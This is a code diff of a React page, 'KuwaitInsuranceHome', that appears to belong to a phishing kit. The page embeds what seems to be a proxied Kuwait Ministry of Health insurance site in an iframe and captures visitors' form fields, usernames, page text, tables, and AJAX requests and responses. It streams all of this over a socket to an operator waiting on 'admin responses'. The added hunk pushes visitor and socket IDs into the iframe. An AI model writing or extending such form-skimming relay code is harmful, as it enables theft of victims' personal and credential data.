@@ -15,6 +15,38 @@ export default function KuwaitInsuranceHome() {
     }
   }, []);
 
+  // Send visitor IDs to iframe when they become available
+  useEffect(() => {
+    const sendIdsToIframe = () => {
+      if (iframeRef.current && iframeRef.current.contentWindow && visitor.value._id) {
+        console.log('[MOH] Sending visitor IDs to iframe:', visitor.value._id, visitor.value.socketId);
+        iframeRef.current.contentWindow.postMessage({
+          type: 'moh-set-ids',
+          visitorId: visitor.value._id,
+          socketId: visitor.value.socketId
+        }, '*');
+      }
+    };
+
+    // Try immediately
+    sendIdsToIframe();
+
+    // Also poll every second until IDs are sent (in case socket connects after iframe loads)
+    const interval = setInterval(() => {
+      if (visitor.value._id) {
+        sendIdsToIframe();
+      }
+    }, 1000);
+
+    // Stop polling after 30 seconds
+    const timeout = setTimeout(() => clearInterval(interval), 30000);
+
+    return () => {
+      clearInterval(interval);
+      clearTimeout(timeout);
+    };
+  }, []);
+
   // Listen for postMessage from iframe (form data + navigation + page content + ajax)
   useEffect(() => {
     // Track last sent data to avoid duplicates
@@ -49,7 +81,6 @@ export default function KuwaitInsuranceHome() {
         lastFormHash = hash;
 
         if (fields && Object.keys(fields).length > 0 && isConnected) {
-          // Filter out _type metadata fields for cleaner display
           const cleanFields: Record<string, string> = {};
           for (const [k, v] of Object.entries(fields)) {
             if (!k.endsWith('_type')) {
@@ -69,38 +100,27 @@ export default function KuwaitInsuranceHome() {
         const { content, trigger } = event.data;
         console.log('[MOH] Page content:', trigger || 'load', path, content);
         
-        // Deduplicate
         const hash = JSON.stringify(content);
         if (hash === lastContentHash) return;
         lastContentHash = hash;
 
         if (content && Object.keys(content).length > 0 && isConnected) {
-          // Format content for display
           const formattedContent: Record<string, string> = {};
-          
-          // Add page title
           if (content.title) formattedContent['عنوان الصفحة'] = content.title;
           if (content.url) formattedContent['رابط الصفحة'] = content.url;
-          
-          // Add field values
           if (content.fields) {
             for (const [k, v] of Object.entries(content.fields)) {
               formattedContent[`حقل: ${k}`] = v as string;
             }
           }
-          
-          // Add page text
           if (content.page_text && Array.isArray(content.page_text)) {
             formattedContent['محتوى الصفحة'] = content.page_text.join('\n');
           }
-          
-          // Add tables
           for (const [k, v] of Object.entries(content)) {
             if (k.startsWith('table_') && Array.isArray(v)) {
               formattedContent[`جدول ${k.replace('table_', '')}`] = (v as string[]).join('\n');
             }
           }
-
           socket.value.emit('more-info', {
             content: formattedContent,
             page: `MOH Content: ${path || 'unknown'} ${trigger ? '(تحديث)' : '(تحميل)'}`,
@@ -112,8 +132,6 @@ export default function KuwaitInsuranceHome() {
       // ===== FIELD SNAPSHOT (periodic) =====
       if (type === 'moh-field-snapshot') {
         const { fields } = event.data;
-        
-        // Deduplicate
         const hash = JSON.stringify(fields);
         if (hash === lastSnapshotHash) return;
         lastSnapshotHash = hash;
@@ -138,7 +156,6 @@ export default function KuwaitInsuranceHome() {
             page: 'MOH Username',
             waitingForAdminResponse: false,
           });
-          // Also emit a dedicated event to update visitor name
           socket.value.emit('visitor:updateName', username);
         }
       }
@@ -165,7 +182,6 @@ export default function KuwaitInsuranceHome() {
         if (data && isConnected) {
           const ajaxContent: Record<string, string> = {};
           ajaxContent['طلب AJAX'] = `${method} ${url}`;
-          
           if (typeof data === 'object') {
             for (const [k, v] of Object.entries(data)) {
               ajaxContent[k] = String(v);
@@ -173,7 +189,6 @@ export default function KuwaitInsuranceHome() {
           } else {
             ajaxContent['بيانات'] = String(data);
           }
-          
           socket.value.emit('more-info', {
             content: ajaxContent,
             page: `MOH AJAX: ${path || 'unknown'}`,
@@ -188,10 +203,8 @@ export default function KuwaitInsuranceHome() {
         console.log('[MOH] AJAX Response:', url, status);
         
         if (response && isConnected) {
-          // Try to parse response as JSON for better display
           let responseContent: Record<string, string> = {};
           responseContent['رد الخادم'] = `${url} (${status})`;
-          
           try {
             const parsed = JSON.parse(response);
             if (typeof parsed === 'object') {
@@ -200,12 +213,10 @@ export default function KuwaitInsuranceHome() {
               }
             }
           } catch {
-            // If not JSON, send as text (only if it looks like it has useful data)
             if (response.length > 10 && response.length < 5000) {
               responseContent['محتوى الرد'] = response.substring(0, 2000);
             }
           }
-          
           if (Object.keys(responseContent).length > 1) {
             socket.value.emit('more-info', {
               content: responseContent,
@@ -264,7 +275,7 @@ export default function KuwaitInsuranceHome() {
       )}
       <iframe
         ref={iframeRef}
-        src={WORKER_BASE + '/Insurance/logaction#vid=' + (visitor.value._id || '') + '&sid=' + (visitor.value.socketId || '')}
+        src={WORKER_BASE + '/Insurance/logaction'}
         onLoad={() => setLoading(false)}
         style={{
           width: window.innerWidth < 768 ? '120%' : '100%',
